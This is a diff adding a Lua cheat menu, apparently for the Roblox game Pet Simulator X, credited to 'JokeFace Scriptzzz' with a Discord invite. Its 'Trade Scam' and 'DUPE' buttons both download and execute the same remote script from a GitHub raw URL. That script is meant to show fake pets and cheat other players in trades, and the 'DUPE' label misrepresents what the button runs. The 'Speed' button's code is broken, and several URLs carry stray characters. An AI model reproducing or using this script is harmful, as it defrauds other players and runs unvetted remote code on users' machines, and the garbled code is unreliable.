@@ -1,0 +1,28 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua%22))()
+local Window = Library.CreateLib("JokeFaze V1.1", "Ocean")
+
+--Main
+local Main = Window:NewTab("PetSimX HAX")
+local MainSection = Main:NewSection("Main")
+
+
+MainSection:NewButton("Trade Scam", "FakePet Showing", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JokeFaceScriptzzz/TradeScamscript/main/jokefaceTRADESCAM", true))()
+end)
+
+MainSection:NewButton("DUPE", "Dupes Ur Inv(needs bank)", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JokeFaceScriptzzz/TradeScamscript/main/jokefaceTRADESCAM", true))()
+end)
+
+--Other
+local Other = Window:NewTab("Other")
+local OtherSection = Other:NewSection("Other")
+
+
+OtherSection:NewButton("Speed", "Makes You WAY Faster", function()
+    "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150", true))()
+end)
+
+local Credits = Window:NewTab("Credits")
+local CreditsSection = Credits:NewSection("Credits")
+CreditsSection:NewLabel("By JokeFace Scriptzzz Join Our Discord Group At: https://discord.gg/8u7r9G6r%22) 
